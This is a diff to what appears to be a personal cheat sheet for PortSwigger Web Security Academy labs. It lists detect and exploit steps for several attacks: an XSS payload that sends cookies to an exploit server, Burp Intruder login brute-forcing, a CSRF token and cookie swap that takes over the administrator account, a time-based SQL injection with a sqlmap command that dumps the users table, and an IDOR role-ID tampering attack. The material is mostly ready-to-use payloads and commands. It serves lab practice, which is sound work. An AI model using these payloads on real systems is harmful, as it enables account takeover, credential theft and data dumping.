@@ -194,33 +194,67 @@ GET /post?postId=1 HTTP/1.1
 Host: LAB-SERVER.web-security-academy.net
 User-Agent: "><script>alert(document.cookie);var x=new XMLHttpRequest();x.open("GET","https://XX_EXPLOIT_SERVER.web-security-academy.net/c-"+document.cookie);x.send();</script>
 ```
-# XSS Blacklisted Tags & Attributes
+# Bruteforce
 ## Detect:
 ```
+List of usernames: https://portswigger.net/web-security/authentication/auth-lab-usernames
+List of passwords: https://portswigger.net/web-security/authentication/auth-lab-passwords
 ```
 ## Exploit:
 ```
+Intruder, login usernames / passwords / parameter example user=BRUTEFORCE
 ```
-# XSS Blacklisted Tags & Attributes
+# CSRF isloggedin
 ## Detect:
 ```
+Set-Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3afalse%7d--MFAOHJNNviuazsqvS%2bywVpIS9UU%2fAhQaFOfa5z8afhuaRHJoj5Q%3d%3d; _lab=.......
 ```
 ## Exploit:
 ```
+Intercept the request to change email.
+Server must never receive the CSRF and consume it, so "Drop" the request.
+
+In another browser session (Incognito), reset a password and input "administrator".
+Intercept the request and change both the CSRF token + cookie using Carlos's cookie.
+
+Username changes from carlos to administrator.
+Copy the cookie into the browser to connect as Administrator.
+
+Set Administrator email to own email, then reset password to login.
 ```
-# XSS Blacklisted Tags & Attributes
+# SQL injection
 ## Detect:
 ```
+Advanced search > searchTerm= etc
 ```
 ## Exploit:
 ```
+GET /searchadvanced?searchTerm='));SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--&organizeby=DATE&blog_artist=a HTTP/1.1
+Host: ...
+
+sqlmap -r request --level 2 --risk 2 --force-ssl --threads 10 --banner --dbs -D public --tables -T users --dump
 ```
-# XSS Blacklisted Tags & Attributes
+# Access Control / IDOR
 ## Detect:
 ```
+Logged in, the feature "Change email".
+Send request to the Repeater.
+
+POST /myaccount/update-email HTTP/1.1
+Host: LAB-SERVER.web-security-academy.net
+Cookie: _lab=XXX; session=XYZXYZXYZ
+Content-Length: 88
+Connection: close
+
+{"csrf":"XXXXXXXXXXXXXXXXXXXX","email":"wiener@normal-user.net"}
 ```
 ## Exploit:
 ```
+{"csrf":"XXXXXXXXXXXXXXXXXXXX","email":"wiener@normal-user.net","roleid":3}
+"Invalid Role ID for carlos"
+
+Intruder 0 to 1000:
+{"csrf":"XXXXXXXXXXXXXXXXXXXX","email":"wiener@normal-user.net","roleid":§§}
 ```
 # XSS Blacklisted Tags & Attributes
 ## Detect:
